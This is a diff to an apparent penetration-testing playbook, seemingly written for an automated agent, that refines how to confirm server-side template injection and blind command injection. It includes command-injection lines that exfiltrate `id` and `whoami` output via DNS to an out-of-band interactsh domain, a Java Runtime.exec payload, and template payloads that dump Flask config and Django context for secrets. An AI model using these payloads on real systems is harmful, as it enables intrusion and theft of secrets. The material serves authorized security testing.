@@ -208,16 +208,21 @@ universal SSTI oracle:
   Liquid, Go text/template) do NOT compute `7*7`; they render empty, echo it, or
   raise a template error the app may swallow into a blank page/redirect. A probe
   that does NOT return `49` is therefore NOT evidence of "not SSTI" -- it may be
-  the WRONG probe for THIS engine. Confirm these by their own tag/variable
-  facility and by DATA disclosure: read a variable already in the render context
-  (Django `{{% debug %}}` dumps the entire context). Disclosing an in-context
-  secret IS the win -- no code execution required. See "Logic-less / sandboxed
-  engines" in `RCE Payload Reference`.
+  the WRONG probe for THIS engine. Confirm these by the engine's own variable/tag
+  facility: render something the engine exposes and diff against a control (e.g.
+  Django `{{% debug %}}`, but ONLY when `DEBUG=True` and the debug context processor
+  is on -- on a production app it renders nothing). What a confirmed injection yields
+  is engine- and target-dependent -- sometimes code execution, sometimes only data
+  already in scope. Both are valid outcomes; pursue whichever the engine and objective
+  actually allow. Do not assume a readable secret is present, and do not assume RCE is
+  reachable. See "Logic-less / sandboxed engines" in `RCE Payload Reference`.
 - **Deferred / stateful sinks:** the render may happen on a LATER request than
   the one you inject on (welcome/confirmation pages, generated emails/PDFs,
   dynamically-built JS/CSS, multi-step wizards). Carry the session forward and
   drive the ENTIRE flow to its rendered artifact before concluding "not
-  reflected." Absence of reflection on the injection request proves nothing.
+  reflected." For a directly-reflected sink you can conclude from the injection
+  response itself; but where the sink COULD be stateful/deferred, absence of
+  reflection on the injection request alone does not rule SSTI out.
 
 #### 4C. Insecure deserialization (CONDITIONAL on `RCE_DESERIALIZATION_ENABLED`)
 
@@ -369,8 +374,11 @@ Before classifying a finding, verify:
   be load spikes, not your payload.)
 - Is the response derived from the executed command (output, timing) or could it
   be a static error / WAF block message?
-- For timing oracles: is the delta >= 800ms vs baseline AND reproducible? Below
-  that threshold = noise, not RCE.
+- For timing oracles: is the delta both REPRODUCIBLE and clearly above the target's
+  OWN measured jitter? Measure baseline variance first — a few hundred ms can be pure
+  noise on a slow/proxied target, while a `sleep 5` should stand out far beyond it.
+  Judge against the observed noise floor, not a fixed cutoff, and prefer a longer sleep
+  to separate signal from jitter when the margin is tight.
 - For SSTI on an arithmetic-evaluating engine: did `7*7` produce 49 (or `7*'7'`
   produce string repetition)? Just reflecting the literal probe text is NOT SSTI
   -- the engine must evaluate it. But do NOT invert this into "no 49 means no
@@ -481,9 +489,14 @@ Look for the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`). This is your
 **REGISTERED_DOMAIN**. It is cryptographically tied to the running client --
 random subdomains will NOT route back.
 
+> `oast.fun` is the DEFAULT public interactsh server. If the project configured a
+> different OOB provider or a self-hosted interactsh, pass that host to `-server`
+> instead. Against an egress-restricted target no callback arrives — treat that as
+> INCONCLUSIVE, not proof the vector is dead.
+
 ### Step 3: Inject OOB payloads pointing at REGISTERED_DOMAIN
 
-**Universal Unix DNS (works in 95% of environments):**
+**Unix DNS exfil (works ONLY where the target can make outbound DNS queries — egress-filtered / air-gapped / no-resolver targets never call back, so silence here is INCONCLUSIVE, not proof of no RCE):**
 ```
 ;nslookup `id`.REGISTERED_DOMAIN
 ;dig +short `whoami`.REGISTERED_DOMAIN
@@ -829,17 +842,19 @@ ${T(java.lang.Runtime).getRuntime().exec('id')}
 **Logic-less / sandboxed engines (arithmetic does NOT evaluate -- this is expected, NOT "no SSTI")**
 
 These engines do not compute `7*7`; a non-`49` result is NOT proof the sink is inert.
-Confirm them by their own variable/tag facility. The win is usually DATA already present
-in the render context (a variable, config, secret, debug dump) -- code execution is
-typically unavailable and unnecessary.
+Confirm them by their own variable/tag facility. What is reachable depends on the engine:
+pure logic-less engines (Mustache) expose only data already in scope, while others
+(Handlebars via prototype gadgets, Go) can escalate. Treat data disclosure and code
+execution as co-equal outcomes and pursue whichever the engine allows.
 ```
 Django templates (Python/Django) -- SANDBOXED
 {% debug %}                          -> dumps the ENTIRE render context (read it for secrets)
 {{ known_context_var }}              -> renders any variable the view passed to the template
 {% for k, v in some_dict.items %}{{ k }}={{ v }}{% endfor %}
   Do NOT expect {{7*7}} to work here; Django templates raise TemplateSyntaxError on it (often
-  swallowed by an app catch-all -> blank page or redirect). Wins are data disclosure, not
-  __class__ object traversal.
+  swallowed by an app catch-all -> blank page or redirect). __class__ object traversal is
+  not available on Django templates; assess impact from what the engine actually exposes
+  rather than assuming either outcome.
 
 Handlebars (Node)   {{this}} / {{#each this}}{{@key}}={{this}}{{/each}}   (data; escalate via prototype gadget)
 Mustache (many)     {{.}} / {{#section}}...{{/section}}                    (pure logic-less -> data disclosure only)
@@ -847,9 +862,10 @@ Liquid (Ruby)       {{ page }} / {{ site }} / {{ settings }} / {% assign %}
 Go text/template    {{ . }} prints the whole data object; {{ printf "%d" 49 }}
 ```
 
-**Data-disclosure primitives (read the render context before reaching for RCE)**
+**Data-disclosure primitives**
 
-The sensitive value is often ALREADY in the render context; read it first:
+Many engines expose data already in the render context; enumerate it as one avenue
+alongside any code-execution path:
 ```
 Jinja2 / Flask : {{ config }}   (Flask config, often SECRET_KEY)    {{ self.__dict__ }}
 Twig           : {{ _context }} (all template vars)                 {{ dump() }} (Debug extension)
